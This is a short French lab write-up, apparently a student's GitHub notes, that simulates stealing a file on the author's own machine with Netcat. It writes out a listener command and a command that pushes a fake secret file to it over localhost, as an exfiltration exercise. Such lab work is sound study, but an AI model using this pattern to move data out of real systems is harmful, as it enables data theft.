# Lab 02 : Exfiltration de Données avec Netcat

**Date :** 14 Février 2026
**Sujet :** Vol de fichier via réseau (Simulation)

## Contexte
J'ai simulé une attaque où je vole un fichier confidentiel d'une machine "Victime" vers ma machine "Attaquant", sans utiliser de copier-coller, juste avec des flux réseaux.

---

### Étape 1 : La victime crée un secret
Sur le premier terminal, j'ai créé un fichier `secret.txt` avec un faux mot de passe et j'ai vérifié son contenu.
**Commandes :**
`echo "mot de passe exo" > secret.txt`
`cat secret.txt`

<img width="340" height="104" alt="image" src="https://github.com/user-attachments/assets/66c5cae5-7a14-4a31-b1a5-be439ea9fd99" />


---

### Étape 2 : L'attaquant prépare le piège
Sur le deuxième terminal, j'ai ouvert le port 4444 en écoute. J'ai utilisé le chevron `>` pour dire : "Tout ce qui arrive sur ce port, enregistre-le dans `butin.txt`".
**Commande :** `nc -lvp 4444 > butin.txt`

<img width="362" height="49" alt="image" src="https://github.com/user-attachments/assets/0e5c9b55-f25e-472b-a697-e2dcb9fa9f9f" />


---

### Étape 3 : L'envoi du fichier (Exfiltration)
Retour sur la machine victime. Je me connecte à l'attaquant et je "pousse" le fichier secret dans le tuyau avec le chevron `<`.
**Commande :** `nc 127.0.0.1 4444 < secret.txt`

<img width="309" height="38" alt="image" src="https://github.com/user-attachments/assets/f3946eac-c7e0-40d4-87fd-27f14607d654" />


---

### Étape 4 : Validation du vol
Sur le terminal de l'attaquant, j'ai coupé la connexion et vérifié que le fichier `butin.txt` contient bien le mot de passe volé.
**Commande :** `cat butin.txt`

<img width="456" height="156" alt="image" src="https://github.com/user-attachments/assets/24250319-3507-47ee-8e7e-7ab50e6c7ad6" />


---

### Ce que j'ai appris
J'ai compris comment déplacer des fichiers d'un ordinateur à un autre juste avec Netcat et les redirections (`<` et `>`). C'est une méthode simple et efficace pour récupérer des données ou envoyer des scripts.
